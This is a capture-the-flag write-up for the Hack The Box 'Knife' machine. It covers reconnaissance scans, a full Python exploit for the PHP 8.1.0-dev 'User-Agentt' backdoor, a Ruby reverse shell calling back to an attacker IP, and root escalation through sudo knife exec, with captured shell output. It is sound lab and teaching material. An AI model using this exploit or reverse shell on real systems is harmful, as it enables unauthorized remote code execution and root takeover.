# nmap 
command : nmap -sC -sV -A -p- --open -vv -oA nmap/10.10.10.242-full 10.10.10.242
- only two ports open (80,22)
```bash
# Nmap 7.91 scan initiated Mon May 31 17:41:10 2021 as: nmap -sC -sV -A -p- --open -vv -oA nmap/10.10.10.242-full 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up, received syn-ack (0.17s latency).
Scanned at 2021-05-31 17:41:10 SAST for 77s
Not shown: 61424 closed ports, 4109 filtered ports
Reason: 61424 conn-refused and 4109 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 31 17:42:27 2021 -- 1 IP address (1 host up) scanned in 77.70 seconds
```


# Web Page

![[Pasted image 20210531235755.png]]

- no clickable links
- no robots.txt

# gobuster
command : gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://knife.htb -x htm,html,asp,aspx,php,php3,php7

![[Pasted image 20210601001352.png]]

- no hits on neither raft* nor directory-list-medium
- FuFF did not find anything either






# Burpsuite
On bursuite, there is a reference in the hearders to 
````bash
X-Powered-By: PHP/8.1.0-dev
````
![[12-secs.webm]]



# User
There is a poc for the module identified by [[40 - Burpsuite]]. An exploit called *User-Agentt* Remote Code Execution

````bash
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

#host = input("Enter the full host url:\n")
host = "http://knife.htb"
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
````

![[OHID9WKEtw.gif]]



# Root
sudo -l reveals commands that can be run as root

```bash
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

I think this is called Chef's Knife but this notes will be corrected once verified.

The command takes arguments for referencing to ruby code.
![[Pasted image 20210605105752.png]]

![[Pasted image 20210605105933.png]]

GITHub has a ruby reverse shell that works

![[Pasted image 20210605110407.png]]
````ruby
#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "10.10.14.10" 
#Set the Remote Host Port
PORT = "7070"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end
````

#### on target machine
````bash
$ sudo /usr/bin/knife exec "/home/james/callhome.rb"
````

#### on attacker box (kali)
````bash
 $ nc -nvlp 7070
listening on [any] 7070 ...
aconnect to [10.10.14.3] from (UNKNOWN) [10.10.10.242] 59916
We are connected!
id
sh: 1: aid: not found
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/
cat /root/root.exe
cat: /root/root.exe: No such file or directory
cat /root/root.txt
6c708bc8e9bc21785efda8d140a8dbd0

````
 
#### animated image for the rooting sequence
![[root 1.gif]]










